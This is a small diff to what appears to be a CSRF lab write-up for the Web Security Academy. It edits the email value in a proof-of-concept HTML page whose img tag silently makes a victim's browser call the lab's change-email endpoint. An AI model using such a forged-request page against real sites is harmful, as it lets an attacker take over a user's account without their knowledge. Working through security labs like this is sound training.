@@ -41,7 +41,7 @@ Cross-Site Request Forgery (CSRF)
 ```html
 <html>
   <body>
-    <img src="https://0a0b00440446b91580961c1600e20098.web-security-academy.net/my-account/change-email?email=attacker@example.com">
+    <img src="https://0a0b00440446b91580961c1600e20098.web-security-academy.net/my-account/change-email?email=xyz@gmail.com.com">
   </body>
 </html>
 ```
